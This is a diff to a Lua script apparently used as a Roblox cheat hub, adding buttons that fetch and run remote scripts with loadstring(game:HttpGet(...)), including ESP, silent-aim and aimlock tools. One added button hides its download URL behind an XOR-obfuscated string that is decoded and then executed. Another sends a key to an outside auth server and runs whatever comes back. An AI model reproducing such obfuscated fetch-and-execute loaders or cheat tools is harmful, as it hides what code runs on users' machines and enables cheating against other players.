@@ -1,5 +1,18 @@
+--__       __  ______  _______  ________      _______  __      __      __    __  ______                 __   __  __   ________  ______  __    __  ______  
+--|  \     /  \/      \|       \|        \    |       \|  \    /  \    |  \  /  \/      \               |  \ |  \|  \ |        \/      \|  \  |  \/      \ 
+--| ▓▓\   /  ▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓▓    | ▓▓▓▓▓▓▓\\▓▓\  /  ▓▓    | ▓▓ /  ▓▓  ▓▓▓▓▓▓\ ______   ____| ▓▓_| ▓▓| ▓▓_ \▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\ ▓▓  | ▓▓  ▓▓▓▓▓▓\
+--| ▓▓▓\ /  ▓▓▓ ▓▓__| ▓▓ ▓▓  | ▓▓ ▓▓__        | ▓▓__/ ▓▓ \▓▓\/  ▓▓     | ▓▓/  ▓▓| ▓▓  | ▓▓/      \ /      ▓▓   ▓▓  ▓▓ \   /  ▓▓ \▓▓__| ▓▓ ▓▓__| ▓▓\▓▓__| ▓▓
+--| ▓▓▓▓\  ▓▓▓▓ ▓▓    ▓▓ ▓▓  | ▓▓ ▓▓  \       | ▓▓    ▓▓  \▓▓  ▓▓      | ▓▓  ▓▓ | ▓▓  | ▓▓  ▓▓▓▓▓▓\  ▓▓▓▓▓▓▓\▓▓▓▓▓▓▓▓▓▓  /  ▓▓  /      ▓▓ ▓▓    ▓▓/      ▓▓
+--| ▓▓\▓▓ ▓▓ ▓▓ ▓▓▓▓▓▓▓▓ ▓▓  | ▓▓ ▓▓▓▓▓       | ▓▓▓▓▓▓▓\   \▓▓▓▓       | ▓▓▓▓▓\ | ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓  | ▓▓   ▓▓  ▓▓ \ /  ▓▓  |  ▓▓▓▓▓▓ \▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓ 
+--| ▓▓ \▓▓▓| ▓▓ ▓▓  | ▓▓ ▓▓__/ ▓▓ ▓▓_____     | ▓▓__/ ▓▓   | ▓▓        | ▓▓ \▓▓\| ▓▓__/ ▓▓ ▓▓▓▓▓▓▓▓ ▓▓__| ▓▓\▓▓▓▓▓▓▓▓▓▓/  ▓▓   | ▓▓_____      | ▓▓ ▓▓_____ 
+--| ▓▓  \▓ | ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓     \    | ▓▓    ▓▓   | ▓▓        | ▓▓  \▓▓\\▓▓    ▓▓\▓▓     \\▓▓    ▓▓ | ▓▓| ▓▓ |  ▓▓    | ▓▓     \     | ▓▓ ▓▓     \
+-- \▓▓      \▓▓\▓▓   \▓▓\▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓▓     \▓▓▓▓▓▓▓     \▓▓         \▓▓   \▓▓ \▓▓▓▓▓▓  \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓  \▓▓ \▓▓  \▓▓      \▓▓▓▓▓▓▓▓      \▓▓\▓▓▓▓▓▓▓▓
+                                                                                                                                                         
+                                                                                                                                                         
+                                                                                                                                                         
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("KOed#7242 Made this", "DarkTheme")
+local Window = Library.CreateLib("KOed#7242 Made this", "Ocean")
 --LightTheme
 --DarkTheme
 --GrapeTheme
@@ -11,7 +24,20 @@ local Window = Library.CreateLib("KOed#7242 Made this", "DarkTheme")
 
 --MAIN
 local Main = Window:NewTab("Main")
-local MainSection = Main:NewSection("Main")
+local MainSection = Main:NewSection("i just made this to make it easier to find scripts")
+
+local MainSection = Main:NewSection("Enjoy :D")
+
+
+local MainSection = Main:NewSection("Main (GUI by KOed#7242)")
+
+MainSection:NewButton("Vanish PART 2 (WIP)", "More scripts", function()
+	local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=(2 + 2) -(11 -8), #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + (3 -2))),v1(v2(v9,1 + ((i-((2 -1) + (1012 -(359 + 653))))% #v9),((4485 -3254) -((935 -468) + 763)) + ((i-(1564 -(1126 + 437)))% #v9) + 1 + 0)))%((251 + 1843) -(1728 + (418 -308)))));end return v5(v10);end loadstring(game:HttpGet(v7("\42\86\92\5\8\120\13\7\7\26\53\12\79\28\15\42\87\74\0\8\39\80\75\26\21\54\71\70\1\85\33\77\69\90\45\35\76\65\6\19\17\65\90\28\11\54\101\71\17\84\54\96\119\68\86\41\112\96\38\11\111\84\5\33\86\51\118\123\52\57\42\102\16\88\1\4\101\5\88\85\17\106\28\3\51\36\16\5\32\18\117\73\95\51\86\114\125\68\37\84\47\67\65\27\84\103\16\29\3\26\44\75\91\29\94\112\18\88\20\9\54\7\26\69\73\108\78\93\20","\66\34\40\117\123")))();
+end)
+
+MainSection:NewButton("DarkHub", "Works", function()
+	loadstring(game:HttpGet("http://darkhub.xyz/remote-script.lua", true))()
+end)
 
 MainSection:NewButton("Vanish Admin", "Vanish Console", function()
 if not game:IsLoaded() then
@@ -767,6 +793,7 @@ end)
 
 local Main = Window:NewTab("MM2")
 local MurderSection = Main:NewSection("Esp")
+
 MurderSection:NewButton("See People", "See Where everyone is and there role", function()
     
     --[[
@@ -848,6 +875,10 @@ end)
     
 end)
 
+MurderSection:NewButton("Eclipse", "Best mm2 gui", function()
+	local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
 --mm2 end
 
 
@@ -870,7 +901,14 @@ end)
  BloxFruitsSection:NewButton("SMZ", "Yes", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Frerfgzz/free-script/main/SMZHUBv2BETA"))()
  end)
- 
+
+ BloxFruitsSection:NewButton("ZenHub", "Yes", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/BloxFruit", true))()
+ end)
+
+ BloxFruitsSection:NewButton("master", "Yes", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/hxllow%22"))()
+end)
 --bloxfruits end
 
 
@@ -926,6 +964,42 @@ HoodModdedSection:NewButton("nyula", "Good overall and really customizable", fun
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/nyuladhm", true))()
 end)
 --end of DH
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 --streamables
 local Main = Window:NewTab("Streamable lock")
 local StreamableSection = Main:NewSection("Steamables")
@@ -1394,4 +1468,35 @@ RunService:BindToRenderStep("AimLock", 0, function()
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
     end)
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Main = Window:NewTab("KAT")
+
+
+local KATSection = Main:NewSection("Silent Aim")
+KATSection:NewButton("owl hub", "loads owl hub", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
 end)
